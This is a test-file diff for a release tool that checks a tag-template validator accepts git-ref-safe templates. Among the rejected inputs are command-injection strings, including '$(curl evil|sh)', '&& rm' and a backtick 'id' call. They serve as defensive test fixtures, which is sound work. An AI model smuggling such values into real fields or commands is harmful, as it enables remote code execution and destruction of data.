@@ -128,6 +128,25 @@ describe('the release tool contract', () => {
     ).toBe(false);
   });
 
+  it('takes a tag template only of characters a git ref may hold', () => {
+    const configure = (tag_template: string) =>
+      releaseInputSchema.safeParse({
+        action: 'configure',
+        scope: 'proj.x',
+        tag_template,
+      }).success;
+    expect(configure('v{version}')).toBe(true);
+    expect(configure('release/{version}')).toBe(true);
+    expect(configure('v{version}-final')).toBe(true);
+    expect(configure('{version}')).toBe(true);
+    expect(configure('v{version}$(curl evil|sh)')).toBe(false);
+    expect(configure('v{version} && rm')).toBe(false);
+    expect(configure('-{version}')).toBe(false);
+    expect(configure('v{version}{version}')).toBe(false);
+    expect(configure('v`id`{version}')).toBe(false);
+    expect(configure(`v{version}${'x'.repeat(100)}`)).toBe(false);
+  });
+
   it('refuses a version with a leading v', () => {
     expect(releaseVersionSchema.safeParse('v0.25.0').success).toBe(false);
     expect(releaseVersionSchema.safeParse('0.25.0').success).toBe(true);
